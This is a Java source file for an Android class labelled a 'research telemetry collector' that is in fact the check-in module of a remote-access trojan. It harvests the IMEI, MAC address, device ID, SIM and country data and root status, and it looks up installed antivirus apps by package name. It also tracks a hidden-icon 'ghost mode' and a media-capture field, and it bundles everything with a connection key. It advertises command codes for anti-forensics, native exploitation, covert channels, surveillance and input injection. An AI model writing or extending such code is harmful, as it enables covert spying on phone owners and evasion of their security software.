package {{PACKAGE}};

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.NetworkInterface;
import java.util.Collections;
import java.util.List;

/**
 * EliteHandshakeData - Research Telemetry Collector
 * Collects all device metrics mapped to the EliteDB schema (shadow.db)
 * Fields: ClientId, DeviceName, Model, AndroidVersion, IpAddress, Country,
 *         BatteryLevel, ScreenStatus, Rooted, AppCount, SimOperator, IMEI,
 *         MacAddress, AvStatus, WifiStrength, Ping, RailPower, ThermalTemp,
 *         KernelLoad, NpuLoad, IsolatedMemory, IntegrityStatus, ResearchPopulation,
 *         IsGhostMode, Latitude, Longitude, RiskScore, SupportedActions
 */
public class EliteHandshakeData {

    private static final String TAG = "EliteHS";

    // ─── Core Identity ───────────────────────────────────────────────────────
    public String clientId       = "";
    public String deviceName     = "";
    public String model          = "";
    public String androidVersion = "";
    public String ipAddress      = "";

    // ─── Elite Telemetry (Clients table columns) ──────────────────────────────
    public String batteryLevel   = "0%";
    public String screenStatus   = "Unknown";
    public int    rooted         = 0;
    public int    appCount       = 0;

    // ─── Extended Telemetry ───────────────────────────────────────────────────
    public int    sourcePort     = 0;
    public String countryCode    = "";
    public String simOperator    = "";
    public String imei           = "";
    public String macAddress     = "";
    public String supportedActions = "";
    public String avStatus       = "Unknown";
    public String wifiStrength   = "0";
    public int    ping           = 0;
    public double railPower      = 0.0;
    public double thermalTemp    = 0.0;
    public double kernelLoad     = 0.0;
    public double npuLoad        = 0.0;
    public double isolatedMemory = 0.0;
    public String integrityStatus  = "unknown";
    public String researchPopulation = "{{PACKAGE}}";
    public int    isGhostMode    = 0;

    // ─── Geolocation & Security ───────────────────────────────────────────────
    public double latitude       = 0.0;
    public double longitude      = 0.0;
    public int    riskScore      = 0;
    public String latestMediaCapture = "";

    // ─── Auth & Key ────────────────────────────────────────────────────────────
    public String connectionKey  = "{{CONNECTION_KEY}}";

    // ══════════════════════════════════════════════════════════════════════════
    //  Collector - fills every field in one call
    // ══════════════════════════════════════════════════════════════════════════
    @SuppressLint({"HardwareIds", "MissingPermission"})
    public static EliteHandshakeData collect(Context ctx) {
        EliteHandshakeData d = new EliteHandshakeData();
        try {
            // ── Identity ────────────────────────────────────────────────────
            d.clientId       = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
            d.model          = Build.MANUFACTURER + " " + Build.MODEL;
            d.androidVersion = "Android " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")";
            d.deviceName     = d.model + " / " + d.androidVersion;

            // ── Battery ──────────────────────────────────────────────────────
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent battery = ctx.registerReceiver(null, ifilter);
            if (battery != null) {
                int lvl   = battery.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = battery.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                if (lvl >= 0 && scale > 0) d.batteryLevel = (int)(lvl * 100f / scale) + "%";
            }

            // ── Screen ───────────────────────────────────────────────────────
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            if (pm != null) d.screenStatus = pm.isInteractive() ? "ON" : "OFF";

            // ── Root ─────────────────────────────────────────────────────────
            d.rooted = isRooted() ? 1 : 0;
            d.riskScore += d.rooted * 40;

            // ── App Count ────────────────────────────────────────────────────
            try {
                d.appCount = ctx.getPackageManager()
                        .getInstalledPackages(0).size();
            } catch (Exception ignored) {}

            // ── SIM / Telephony ──────────────────────────────────────────────
            try {
                TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
                if (tm != null) {
                    d.simOperator = tm.getNetworkOperatorName();
                    d.countryCode = tm.getNetworkCountryIso().toUpperCase();
                    if (ctx.checkSelfPermission(Manifest.permission.READ_PHONE_STATE)
                            == PackageManager.PERMISSION_GRANTED) {
                        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                            d.imei = tm.getDeviceId();
                        } else {
                            d.imei = tm.getImei();
                        }
                    }
                }
            } catch (Exception e) { Log.w(TAG, "TM: " + e.getMessage()); }

            // ── MAC Address ──────────────────────────────────────────────────
            try {
                List<NetworkInterface> ifaces = Collections.list(NetworkInterface.getNetworkInterfaces());
                for (NetworkInterface iface : ifaces) {
                    byte[] mac = iface.getHardwareAddress();
                    if (mac != null && mac.length == 6) {
                        StringBuilder sb = new StringBuilder();
                        for (byte b : mac) sb.append(String.format("%02X:", b));
                        d.macAddress = sb.toString().replaceAll(":$", "");
                        break;
                    }
                }
            } catch (Exception ignored) {}

            // ── WiFi ─────────────────────────────────────────────────────────
            try {
                WifiManager wm = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                if (wm != null && wm.isWifiEnabled()) {
                    WifiInfo wi = wm.getConnectionInfo();
                    if (wi != null) {
                        int rssi = wi.getRssi();
                        d.wifiStrength = WifiManager.calculateSignalLevel(rssi, 5) + "/5 (" + rssi + "dBm)";
                    }
                }
            } catch (Exception ignored) {}

            // ── AV / Security Apps ───────────────────────────────────────────
            d.avStatus = detectAV(ctx);
            if (!d.avStatus.equals("None")) d.riskScore += 20;

            // ── Thermal ──────────────────────────────────────────────────────
            try {
                String tempStr = shell("cat /sys/class/thermal/thermal_zone0/temp");
                if (tempStr != null && !tempStr.isEmpty()) {
                    d.thermalTemp = Double.parseDouble(tempStr.trim()) / 1000.0;
                }
            } catch (Exception ignored) {}

            // ── CPU Load (Kernel Load approx.) ───────────────────────────────
            try {
                String uptime = shell("cat /proc/loadavg");
                if (uptime != null && !uptime.isEmpty()) {
                    String[] parts = uptime.trim().split("\\s+");
                    if (parts.length > 0) d.kernelLoad = Double.parseDouble(parts[0]);
                }
            } catch (Exception ignored) {}

            // ── Memory (Isolated / Available) ────────────────────────────────
            try {
                String memInfo = shell("cat /proc/meminfo | grep MemAvailable");
                if (memInfo != null && memInfo.contains("MemAvailable")) {
                    String num = memInfo.replaceAll("[^0-9]", "");
                    if (!num.isEmpty()) d.isolatedMemory = Long.parseLong(num) / 1024.0; // MB
                }
            } catch (Exception ignored) {}

            // ── RailPower (CPU Freq approx.) ─────────────────────────────────
            try {
                String freq = shell("cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq");
                if (freq != null && !freq.trim().isEmpty()) {
                    d.railPower = Long.parseLong(freq.trim()) / 1000000.0; // GHz
                }
            } catch (Exception ignored) {}

            // ── Integrity ────────────────────────────────────────────────────
            d.integrityStatus = (d.rooted == 1) ? "COMPROMISED" : "OK";

            // ── Supported Actions (from BinaryCmdType) ───────────────────────
            d.supportedActions = buildSupportedActions();

            // ── Ghost Mode (no launcher icon) ────────────────────────────────
            d.isGhostMode = {{HIDE_ICON_BOOL}};

        } catch (Exception e) {
            Log.e(TAG, "Collect error: " + e.getMessage());
        }
        return d;
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  Serialise to JSON (matches EliteDB column names exactly)
    // ══════════════════════════════════════════════════════════════════════════
    public JSONObject toJSON() {
        JSONObject j = new JSONObject();
        try {
            // Identity
            j.put("id",          clientId);
            j.put("name",        deviceName);
            j.put("model",       model);
            j.put("ver",         androidVersion);
            j.put("ip",          ipAddress);

            // Elite Telemetry
            j.put("batt",        batteryLevel);
            j.put("screen",      screenStatus);
            j.put("root",        rooted);
            j.put("apps",        appCount);

            // Extended Telemetry
            j.put("port",        sourcePort);
            j.put("countryCode", countryCode);
            j.put("simOp",       simOperator);
            j.put("imei",        imei);
            j.put("mac",         macAddress);
            j.put("actions",     supportedActions);
            j.put("av",          avStatus);
            j.put("wifi",        wifiStrength);
            j.put("ping",        ping);
            j.put("railPower",   railPower);
            j.put("thermal",     thermalTemp);
            j.put("kernel",      kernelLoad);
            j.put("npu",         npuLoad);
            j.put("isolated",    isolatedMemory);
            j.put("integrity",   integrityStatus);
            j.put("research",    researchPopulation);
            j.put("ghost",       isGhostMode);

            // Geolocation & Security
            j.put("lat",         latitude);
            j.put("lon",         longitude);
            j.put("risk",        riskScore);
            j.put("media",       latestMediaCapture);

            // Auth
            j.put("key",         connectionKey);

        } catch (Exception e) {
            Log.e(TAG, "JSON error: " + e.getMessage());
        }
        return j;
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  Helpers
    // ══════════════════════════════════════════════════════════════════════════
    private static boolean isRooted() {
        String[] paths = {"/system/app/Superuser.apk","/sbin/su","/system/bin/su",
                          "/system/xbin/su","/data/local/xbin/su","/data/local/bin/su",
                          "/system/sd/xbin/su","/system/bin/failsafe/su","/data/local/su",
                          "/data/adb/magisk","/data/adb/ksu"};
        for (String p : paths) if (new File(p).exists()) return true;
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"which", "su"});
            return p.waitFor() == 0;
        } catch (Exception ignored) {}
        return false;
    }

    private static String detectAV(Context ctx) {
        String[] avPackages = {
            "com.lookout", "com.avast.android.mobilesecurity", "com.avg.antivirus",
            "com.antivirus", "com.bitdefender.security", "com.drweb",
            "com.eset.ems2.gp", "com.fsecure.ms.safe", "com.ikarus.mobile.security",
            "com.kaspersky.kes", "com.mcafee.vsm_android", "com.norton.protection",
            "com.qihoo.security", "com.trendmicro.tmmss", "com.zscaler.android.ziaapp"
        };
        StringBuilder found = new StringBuilder();
        PackageManager pm = ctx.getPackageManager();
        for (String pkg : avPackages) {
            try {
                pm.getPackageInfo(pkg, 0);
                if (found.length() > 0) found.append(",");
                found.append(pkg.substring(pkg.lastIndexOf('.') + 1));
            } catch (PackageManager.NameNotFoundException ignored) {}
        }
        return found.length() > 0 ? found.toString() : "None";
    }

    private static String buildSupportedActions() {
        return "0x01,0x02,0x03,0x04,0x05,0x06," +   // File Navigation
               "0x10,0x11,0x12,0x13," +              // Anti-Forensics
               "0x20,0x21,0x22,0x23," +              // Native Exploitation
               "0x30,0x31,0x32,0x33,0x34," +         // Covert Channels
               "0x40,0x41,0x42,0x43," +              // Surveillance
               "0x50,0x51";                          // Input Injection
    }

    @SuppressLint("DefaultLocale")
    private static String shell(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = r.readLine();
            p.waitFor();
            return line;
        } catch (Exception e) { return ""; }
    }
}
